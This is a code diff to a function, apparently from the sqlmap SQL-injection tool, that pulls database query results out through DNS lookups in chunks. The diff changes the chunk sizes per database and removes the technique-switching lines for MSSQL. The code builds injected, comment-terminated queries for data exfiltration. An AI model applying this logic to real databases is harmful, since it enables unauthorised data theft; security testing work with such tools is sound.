@@ -57,12 +57,11 @@ def dnsUse(payload, expression):
 
         if output is None:
             kb.dnsMode = True
-            pushValue(kb.technique)
 
             while True:
                 count += 1
                 prefix, suffix = ("%s" % randomStr(3) for _ in xrange(2))
-                chunk_length = MAX_DNS_LABEL / 2
+                chunk_length = MAX_DNS_LABEL / 2 if Backend.isDbms(DBMS.ORACLE) else MAX_DNS_LABEL / 4 - 2
                 _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                 nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
@@ -74,9 +73,6 @@ def dnsUse(payload, expression):
 
 
                 if Backend.isDbms(DBMS.MSSQL):
-                    kb.technique = PAYLOAD.TECHNIQUE.STACKED
-                    expression = cleanQuery(expression)
-
                     comment = queries[Backend.getIdentifiedDbms()].comment.query
                     query = agent.prefixQuery("; %s" % expressionUnescaped)
                     query = agent.suffixQuery("%s;%s" % (query, comment))
@@ -96,7 +92,6 @@ def dnsUse(payload, expression):
                 else:
                     break
 
-            kb.technique = popValue()
             kb.dnsMode = False
 
         if output is not None:
